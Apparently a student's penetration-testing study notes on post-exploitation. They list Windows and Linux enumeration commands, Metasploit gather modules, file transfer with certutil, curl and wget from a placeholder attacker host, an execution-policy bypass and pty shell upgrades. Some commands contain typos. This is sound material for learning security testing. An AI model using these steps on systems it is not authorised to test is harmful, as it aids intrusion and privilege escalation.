
Post-Exploitation

- Introduction to Post-Exploitation
    - Consists of the tactics, techniques, procedures after obtaining initial access on a target system
    - Will differ based on the target operating system as well as the target infraestructure

- Post-Exploitation methodology
    - Phases:
        1. Local Enumeration
        2. Transferring files
        3. Upgrading shells
        4. Privilege Escalation
        5. Persistence
        6. Dumping & cracking hashes
        7. Pivoting
        8. Clearing Tracks

Windows Local Enumeration

- Enumerating Sytem Information
    - What are we looking for:
        - Hostname
        - OS Name
        - OS Build & Service Pack
        - OS Architecture
        - Installed updates & hotfixes
    - Shell
        - hostname 
        - systeminfo
        - wmic qfe get Caption,Description,HotFixID,InstalledOn
        - C:\\Windows\System32\eula.txt (version, build, etc)

- Enumerating Users & Groups
    - What are we looking for:
        - Current user & privileges
        - Additional user information
        - Other users on the system
        - Groups
        - Members of the built-in administrator group
    - Meterpreter
        - getuid
        - getprivs
        - module logged_on
    - Shell
        - whoami
        - whoami /priv
        - query user 
        - net users 
        - net user administrator 
        - net localgroup
        - net localgroup administrators

- Enumerating Network Information
    - What are we looking for:
        - Current IP addresses & network adapters
        - Internal networks
        - TCP/UDP running 
        - Other hosts in the network
        - Routing table 
        - Windows Firewall state
    - Shell
        - ipconfig
        - route print 
        - arp -a 
        - netstat -ano 
        - netsh firewall show state
        - netsh advfirewall firewall show state 

- Enumerating processes and services
    - What are we looking for:
        - Running processes & services-
        - Scheduled tasks
    - A process os an instance of a running executable or program 
    - A service is a process which runs in the background and does not interact with the desktop 
    - Meterpreter:
        - ps 
    - Shell:
        - net start 
        - wmic service list brief
        - tasklist /SVC
        - schtasks /query /fo LIST v

- Automating Windows Local Enumeration
    - We can automate the process with metasploit modules
    - JAWS: Just Another Windows Enum Script (https://github.com/411Hall/JAWS)
    - Meterpreter
        - gather/win_privs module 
        - gather/checkvm module 
        - gather/enum_applications module 
        - gather/enum_computers module 
        - gather/enum_patches module 
        - gather/enum_shares module 
    - Shell
        - powershell.exe -ExecutionPolicy Bypass -File .\jaws.psl -OutputFilename JAWS-enum.txt
   
Linux Local Enumeration

- Enumerating System information
    - What are we looking for:
        - Hostname
        - Distribution & distribution release version
        - Kernel version & Architecture
        - CPU information
        - Disk information & mounted drives
        - Installed packages/software
    - Meterpreter
        - sysinfo
    - Bash
        - hostname
        - cat /etc/*realease
        - cat /etc/issue
        - uname -a
        - env
        - lscpu
        - free -h
        - df -h 
        - lsblk | grep sd
        - dpkgl

- Enumerating users & groups
    - What are we looking for:
        - Current user & privileges
        - Other users on the system
        - Groups
    - Meterpreter 
        - getuid
    - Bash
        - whoami
        - groups
        - groups <user>
        - cat /etc/passwd
        - last
        - lastlog

- Enumerating Network information
    - What are we looking for:
        - IP addresses and network adapters
        - Internal networks
        - TCP/UDP services
        - Other hosts on the network
    - Meterpreter
        - ifconfig
        - netstat
        - route
        - arp
    - Bash
        - ifconfig
        - ip a s
        - cat /etc/networks
        - cat /etc/hosts
        - cat /etc/resolv.conf
        - arp -a 

- Enumerating processes and cron jobs 
    - What are we looking for:
        - Running services
        - Cron jobs
    - Meterpreter
        - ps
    - Bash
        - ps aux
        - ps aux | grep root
        - top 
        - crontab -l 
        - ls -al /etc/cron*
        - cat /etc/cron*

- Automating Linux Local Enumeration 
    - We can automate the process with metasploit modules
    - LinEnum: simple bash script that automates enumeration (https://github.com/rebootuser/LinEnum)
    - Meterpreter
        - gather/enum_configs module
        - gather/enum_network module
        - gather/enum_system module
        - gather/enum_system module
        - gather/checkvm module

Transferring Files To Windows & Linux Targets

- Transferring files to Windows Targets
    - python3 -m http.server <port>
    - certutil -urlcache http://<ip>/<filename> <filename>

- Transferring files to Linux Targets
    - python3 -m http.server <port>
    - curl http://<ip>/<filename> > <filename>
    - wget http://<ip>/<filename>

Upgrading Shells

- Upgrading non-interactive shells
    - No prompt = non interactive
    - cat /etc/shells
    - /bin/bash -i 
    - python --version
    - python -c 'import pty; pty.spawn("/bin/bash")'
    - perl --help
    - perl -e 'exec "/bin/bash";'
    - ruby: exec "/bin/bash"
    - export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin